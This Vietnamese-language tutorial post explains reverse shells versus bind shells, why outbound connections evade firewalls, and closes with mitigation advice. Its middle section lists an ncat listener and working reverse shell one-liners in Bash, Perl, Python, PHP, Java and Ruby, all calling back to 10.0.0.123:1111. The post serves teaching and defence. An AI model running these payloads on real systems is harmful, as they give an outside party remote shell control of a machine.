## Reverse shell là gì ?

Reverse shell là 1 loại session shell (ngoài ra còn có web shell, bind shell,.. ) là shell có kết nối bắt nguồn từ 1 máy chủ đóng vai trò là target đến 1 máy chủ khác đóng vai trò host . Khi đó target sẽ tạo kết nối ra bên ngoài và host sẽ lắng nghe. Trong trường hợp Attacker mà đã khai thác được lỗ hổng có thể dẫn đến RCE có thể dùng Reverse shell để tạo kết nối đến máy attacker để hacker thao tác với máy target. Một Reverse shell (hay còn gọi connect-back shell) cũng có thể là cách duy nhất để để thao tác remote thông qua shell mà không gặp vấn đề với NAT hoặc firewall. 

## Reverse shell hoạt động như thế nào ?
![](https://images.viblo.asia/9285325f-1814-4de5-b910-b0efcdde2d4c.png)


Như bình thường, để có thể tạo ra remote shell để remote từ xa, máy tính của attacker kết nối tới một máy chủ target và yêu cầu một shell session - đây gọi là bind shell. Nhưng có 1 vấn đề có thể xảy ra là nếu máy chủ kia không thể truy cập trực tiếp , ví dụ là có thể không có public IP hoặc được bảo vệ với Firewall thì sao? Trong trường hợp này, Reverse shell cần được sử dụng, khi mà target có một kết nối ra bên ngoài để host lắng nghe các kết nối đến và tạo nên shell session.

![](https://images.viblo.asia/21372496-46c9-4452-8b67-a9603575f90b.png)

Reverse shell thường là cách duy nhất để thực hiện quản lí từ xa tới host thông qua NAT, cho nên nó cần quyền admin để sử dụng. Tuy nhiên , nó cũng có thể được tận dụng bởi tội phạm mạng để kết nối và thực thi các lệnh trên những máy chủ được bảo vệ bởi firewall hoặc hệ thống bảo mật mạng khác. Ví dụ 1 đoạn mã độc malware được cài đặt trên máy chủ nội bộ thông qua email giả mạo hoặc 1 trang web độc hại có thể tạo ra 1 kết nối ra bên ngoài tới 1 CMS và cho phép hacker sử dụng được reverse shell .Trong khi Firewall thì đa số lọc các kết nối từ bên ngoài vào cho nên những kết nối từ nội bộ ra ngoài tới 1 server đang lắng nghe thường thành công.

Khi thử tấn công đến server , kẻ tấn công thường thử khai thác các lỗ hổng về command injection ở trên hệ thống của mục tiêu . Các đoạn lệnh được inject thường là reverse shell script để cung cấp 1 môi trường thuận tiện cho việc sử dụng các command shell và thực thi các hành vi độc hại sau này.

## Ví dụ về Reverse shell
Để bắt đầu, attacker cần bắt đầu 1 listener processe trên chính máy của attacker để nhận các kết nối reverse shell tới IP của attacker, ví dụ IP attacker là 10.0.0.123 , trên Linux . Nó được thực hiện vởi netcat command như sau :
```
ncat -l -p 1111
```
Nó sẽ tạo ra 1 process netcat listener trên cổng 1111. Lúc này attacker sẽ cần chạy đoạn mã thực thi trên máy trính mục tiêu, kết nối đến listener. Đã có rất nhiều reverse shell code có sẵn dành cho các loại hệ điều hành và viết bởi nhiều ngôn ngữ khác nhau (xem thêm tại [pentestmonkey’s Reverse Shell Cheat Sheet ](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)) và trên kali cũng có sẵn [1 loạt các webshells](https://tools.kali.org/maintaining-access/webshells) và reverese shell. Dưới đây là ví dụ dành cho Linux và Unix , một số sẽ hoạt động được cả trên windows nếu thay đổi command line interpreter gọi từ `/bin/sh -i`  thành `cmd.exe`.

### Bash Reverse shell

Nếu máy tính mục tiêu chạy trên Linux, nó khá là lý tưởng để bắt đầu bằng bash và gần như tất cả các hệ thống linux đều hoạt động với shell này :
```
/bin/bash -i >& /dev/tcp/10.0.0.123/1111 0>&1
```
### Perl Reverse shell

Cũng như Bash , perl interpreter cũng gần như có sẵn trên các hệ thống server linux, cho nên Perl cũng là 1 lựa chọn khác để chạy reverse shell:
```
perl -e 'use Socket;$i="10.0.0.123";$p=1111;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Python reverse shell

Với sự phát triển khá phổ biến hiện nay của python thì 1 lựa chọn khác mà có sẵn trên các hệ thống có thể thực thi lệnh như sau :
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.123",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP reverse shell

Gần như đa số web server PHP cũng cung cấp các reverse shell vector :
```
php -r '$sock=fsockopen("10.0.0.123",1111);exec("/bin/sh -i <&3 >&3 2>&3");
```
### Java Reverse Shell

Java thì cũng gần như có sẵn trên các ứng dụng server :
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.123/1111;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### Ruby Reverse Shell

Ruby thì cũng là 1 ngôn ngữ khá là nổi cho web app cho nên nó cũng có để phục vụ 1 số mục đích trên server :
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.123",1111).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Ngăn chặn reverse shell

Trừ khi bạn cố tình sử dụng reverse shell để quản trị từ xa thì bất kỳ mọi kết nối reverse shell nào cũng có thể là độc hại. Thật không may, cũng không có cách nào chắc chắn để chặn các kết nối reverse shell trên hệ thống mạng, đặc biệt là máy chủ. Bạn có thể giảm thiểu rủi ro bằng cách : 

- Để hạn chế khai thác, bạn có thể khóa kết nối ra ngoài và chỉ cho phép các địa chỉ IP và cổng cụ thể hoạt động cho các dịch vụ được yêu cầu. Điều này có thể đạt được bằng cách dùng sandbox hoặc chạy máy chủ trong một môi trường cô lập. Một cách khác có thể là thiết lập một máy chủ proxy quản lí chặt các điểm đến. Tuy nhiên, các reverse shell cũng có thể được tạo ngay cả trên DNS cho nên việc làm như vậy chỉ có thể hạn chế rủi ro của các kết nối  reverseshell chứ không loại bỏ được.
- Ngoài ra cũng có thể khiến cho việc tấn công cảu attacker khó hơn là xóa tất cả các tools và interpreter để ngăn chặn sự thực thi của 1 số shell code. Nhưng đây cũng không làm thay đổi lắm vì có thể attacker vẫn có thể tìm và cài các shell khác lên :)